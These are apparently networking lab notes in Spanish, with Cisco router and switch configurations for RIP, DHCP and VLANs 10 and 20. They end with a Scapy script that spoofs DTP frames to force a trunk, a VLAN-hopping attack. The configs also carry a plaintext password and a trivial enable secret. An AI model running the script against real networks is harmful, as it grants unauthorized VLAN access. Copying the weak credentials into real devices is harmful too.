## Configuración Equipos de Comunicacion
### Configuracion de RTS1-A
```
hostname RTS1-A
!
username dpacheco password lesand2024
enable secret 2024
line vty 0 15
 login local
!
int g0/1
 ip add 192.168.3.1 255.255.255.0
 no shut
!
router rip
 version 2
 network 192.168.3.0
 network 192.168.4.0
 !
 interface lo1
  ip add 192.168.4.10 255.255.255.0
!
ip dhcp excluded-address 192.168.1.1 192.168.1.5
ip dhcp excluded-address 192.168.0.1 192.168.0.5
!
ip dhcp pool V10
 network 192.168.0.0 255.255.255.0
 default-router 192.168.0.1
!
ip dhcp pool V20
 network 192.168.1.0 255.255.255.0
 default-router 192.168.1.1

```
### Configuracion de RTS1-B
```
hostname RTS1-B
!
username dpacheco password lesand2024
enable secret 2024
!
line vty 0 15
 login local
!
int g0/1
 ip add 192.168.3.2 255.255.255.0
 no shut
!
int g0/0
 no shut
int g0/0.10
 encapsulation dot1q 10
 ip add 192.168.0.1 255.255.255.0
int g0/0.20
 encapsulation dot1q 20
 ip add 192.168.1.1 255.255.255.0
!
router rip
 version 2
 network 192.168.3.0
 network 192.168.0.0
 network 192.168.1.0
 !
int g0/0.10
 ip helper-address 192.168.4.10
int g0/0.20
 ip helper-address 192.168.4.10

``` 
### Configuracion de S1
```
hostname S1
vlan 10
vlan 20
int Gi0/0
 switchport trunk encapsulation dot1q
 switchport mode trunk
int Gi1/1
 switchport mode access
 switchport access vlan 10
int Gi1/2
 switchport mode access
 switchport access vlan 20
```

### Ejemplo Script para DTP
```
from scapy.all import *
load_contrib("dtp")
ASD = sniff(filter="ether[20:2] == 0x2004",count=1)    

ASD[0].src="00:00:00:13:54:2d"
ASD[0][DTP][DTPStatus].status='\x03'
#ASD[0][DTP][DTPType].dtptype='E'
sendp(ASD[0])
```
